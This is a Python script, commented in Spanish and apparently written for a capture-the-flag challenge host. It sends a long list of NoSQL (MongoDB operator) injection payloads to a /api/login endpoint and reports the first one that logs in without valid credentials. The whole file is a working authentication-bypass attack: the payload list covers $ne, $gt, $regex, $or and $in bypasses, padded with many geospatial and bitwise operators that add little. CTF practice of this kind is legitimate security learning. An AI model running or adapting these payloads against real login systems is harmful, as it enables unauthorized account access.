#!/usr/bin/env python3
import requests
import json

# URL base
base_url = "http://c211cmyxmzm3.playat.flagyard.com"

# Payloads de NoSQL injection para probar
payloads = [
    # Bypass básico
    {"email": {"$ne": None}, "password": {"$ne": None}},
    {"email": {"$ne": ""}, "password": {"$ne": ""}},
    {"email": {"$gt": ""}, "password": {"$gt": ""}},
    {"email": {"$regex": ".*"}, "password": {"$regex": ".*"}},
    {"email": {"$regex": "^.*"}, "password": {"$regex": "^.*"}},
    
    # Bypass con operadores lógicos
    {"$or": [{"email": "admin@admin.com"}, {"email": {"$ne": None}}]},
    {"$or": [{"email": "admin@admin.com"}, {"password": {"$ne": None}}]},
    {"$and": [{"email": {"$ne": None}}, {"password": {"$ne": None}}]},
    
    # Bypass con operadores de array
    {"email": {"$in": ["admin@admin.com", "test@test.com"]}},
    {"password": {"$in": ["admin", "password", "123456"]}},
    
    # Bypass con operadores de existencia
    {"email": {"$exists": True}, "password": {"$exists": True}},
    {"email": {"$type": "string"}, "password": {"$type": "string"}},
    
    # Bypass con operadores de tamaño
    {"email": {"$size": 0}, "password": {"$size": 0}},
    
    # Bypass con operadores de texto
    {"email": {"$text": {"$search": "admin"}}},
    
    # Bypass con operadores de geolocalización
    {"email": {"$geoWithin": {"$center": [[0, 0], 0]}}},
    {"password": {"$geoWithin": {"$center": [[0, 0], 0]}}},
    
    # Bypass con operadores de proximidad
    {"email": {"$near": {"$geometry": {"type": "Point", "coordinates": [0, 0]}}}},
    {"password": {"$near": {"$geometry": {"type": "Point", "coordinates": [0, 0]}}}},
    
    # Bypass con operadores de intersección
    {"email": {"$geoIntersects": {"$geometry": {"type": "Point", "coordinates": [0, 0]}}}},
    {"password": {"$geoIntersects": {"$geometry": {"type": "Point", "coordinates": [0, 0]}}}},
    
    # Bypass con operadores de caja
    {"email": {"$geoWithin": {"$box": [[0, 0], [0, 0]]}}},
    {"password": {"$geoWithin": {"$box": [[0, 0], [0, 0]]}}},
    
    # Bypass con operadores de polígono
    {"email": {"$geoWithin": {"$polygon": [[0, 0], [0, 0], [0, 0]]}}},
    {"password": {"$geoWithin": {"$polygon": [[0, 0], [0, 0], [0, 0]]}}},
    
    # Bypass con operadores de centro esférico
    {"email": {"$geoWithin": {"$centerSphere": [[0, 0], 0]}}},
    {"password": {"$geoWithin": {"$centerSphere": [[0, 0], 0]}}},
    
    # Bypass con operadores de elemento
    {"email": {"$elemMatch": {"$ne": ""}}},
    {"password": {"$elemMatch": {"$ne": ""}}},
    
    # Bypass con operadores de todos
    {"email": {"$all": ["admin@admin.com"]}},
    {"password": {"$all": ["admin"]}},
    
    # Bypass con operadores de no en
    {"email": {"$nin": [""]}},
    {"password": {"$nin": [""]}},
    
    # Bypass con operadores de módulo
    {"email": {"$mod": [1, 0]}},
    {"password": {"$mod": [1, 0]}},
    
    # Bypass con operadores de bits
    {"email": {"$bitsAllSet": [0]}},
    {"password": {"$bitsAllSet": [0]}},
    
    # Bypass con operadores de bits
    {"email": {"$bitsAnySet": [0]}},
    {"password": {"$bitsAnySet": [0]}},
    
    # Bypass con operadores de bits
    {"email": {"$bitsAllClear": [0]}},
    {"password": {"$bitsAllClear": [0]}},
    
    # Bypass con operadores de bits
    {"email": {"$bitsAnyClear": [0]}},
    {"password": {"$bitsAnyClear": [0]}},
]

def test_payload(payload):
    try:
        response = requests.post(
            f"{base_url}/api/login",
            headers={"Content-Type": "application/json"},
            json=payload,
            timeout=10
        )
        
        result = response.json()
        status_code = response.status_code
        
        print(f"Status: {status_code}")
        print(f"Payload: {json.dumps(payload, indent=2)}")
        print(f"Response: {json.dumps(result, indent=2)}")
        print("-" * 80)
        
        # Si el login es exitoso, devolver True
        if status_code == 200 and "success" in result and result["success"]:
            return True
            
    except Exception as e:
        print(f"Error testing payload: {e}")
        print("-" * 80)
    
    return False

def main():
    print("Testing NoSQL injection payloads on /api/login")
    print("=" * 80)
    
    successful_payloads = []
    
    for i, payload in enumerate(payloads):
        print(f"Testing payload {i+1}/{len(payloads)}")
        if test_payload(payload):
            successful_payloads.append(payload)
            print("*** SUCCESSFUL PAYLOAD FOUND! ***")
            break
    
    if successful_payloads:
        print(f"\nFound {len(successful_payloads)} successful payloads:")
        for payload in successful_payloads:
            print(json.dumps(payload, indent=2))
    else:
        print("\nNo successful payloads found.")

if __name__ == "__main__":
    main()